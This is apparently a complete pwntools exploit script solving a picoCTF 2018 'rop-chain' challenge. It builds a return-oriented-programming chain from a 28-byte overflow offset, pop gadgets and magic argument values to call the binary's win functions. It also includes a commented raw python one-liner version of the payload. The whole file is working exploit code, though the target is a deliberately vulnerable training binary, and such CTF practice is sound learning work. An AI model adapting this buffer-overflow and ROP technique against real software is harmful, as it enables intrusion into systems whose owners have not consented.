from pwn import *

# s = ssh(host='2018shell1.picoctf.com',user='dr3dd',password='')

# p = s.process('/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop')
p  = process('./rop')
elf = ELF('./rop')
pppr = 0x080487e9
pr = 0x0804840d
ppr = 0x080487ea
offset = 28
win_function1 = elf.symbols['win_function1']
win_function2 = elf.symbols['win_function2']
flag = elf.symbols['flag']

rop_chain  = ""
rop_chain += "A"*offset
rop_chain += p32(win_function1)
rop_chain += p32(win_function2)
rop_chain += p32(pr)
rop_chain += p32(0xBAAAAAAD)
rop_chain += p32(flag)
rop_chain += p32(pr)
rop_chain += p32(0xDEADBAAD)
print(hex(win_function1),hex(win_function2),hex(flag))
p.recvuntil('Enter your input> ')
p.sendline(rop_chain)
print p.recv(1024)
p.interactive()


#(python -c 'print "A"*28 + "\xcb\x85\x04\x08" + "\xd8\x85\x04\x08" + "\x0d\x84\x04\x08" + "\xAD\xAA\xAA\xBA" + "\x2b\x86\x04\x08" + "\x0d\x84\x04\x08" + "\xAD\xBA\xAD\xDE"') | ./rop
